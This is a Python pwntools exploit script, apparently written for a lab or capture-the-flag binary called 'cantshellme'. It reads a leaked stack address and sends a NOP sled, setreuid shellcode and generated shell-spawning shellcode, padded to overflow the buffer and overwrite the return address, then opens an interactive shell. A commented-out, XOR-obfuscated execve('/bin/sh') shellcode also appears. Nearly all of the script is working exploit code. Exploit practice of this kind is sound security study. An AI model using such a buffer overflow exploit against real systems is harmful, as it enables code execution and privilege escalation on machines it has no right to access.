#!/usr/bin/env python3
from pwn import *
import flexshell

######################################################
# TODO: Demo fleshell against some vulnerable code
# Currently does not work for the nobinsh code and
# not sure why. Need to investigate further
#####################################################

context(arch = 'amd64', os='linux')

p = process('./cantshellme')
p.recvuntil(b':')
buffid = p.recvlines(1)

lengthofbuff = 168
buffid1 = buffid[0]
buffid2 = int(buffid1,16)
# shell_string = '''
# xor esi, esi
# push rsi
# mov rbx, 0x6a712d2d6c6b602d
# mov r9, 0x0202020202020202
# xor rbx,r9
# push rbx
# push rsp
# pop rdi
# imul esi
# mov al, 0x3b
# syscall
# '''
# payload = asm(shellcraft.setreuid(1017))
shellcode_reuid = shellcraft.setreuid(1000)
payload = asm(shellcraft.setreuid(1000))
# print("test shellcode: \n",flexshell.combined(flexshell.compact()))
# print("\n shell string that works: \n", shell_string)
payload += asm(flexshell.combined(flexshell.compact()))
# payload += asm(shell_string)
remlenbuf = lengthofbuff - len(payload)
# print("")
print("remaining buff: ", remlenbuf)
payloads = b'\x90' * (remlenbuf-40)
payloads += payload
payloads += b'A'*40
payloads += p64(buffid2)
# the return address memory is located at 137 bytes
#gdb.attach(p,"b *get_name +130")
p.sendline(payloads)
p.interactive()
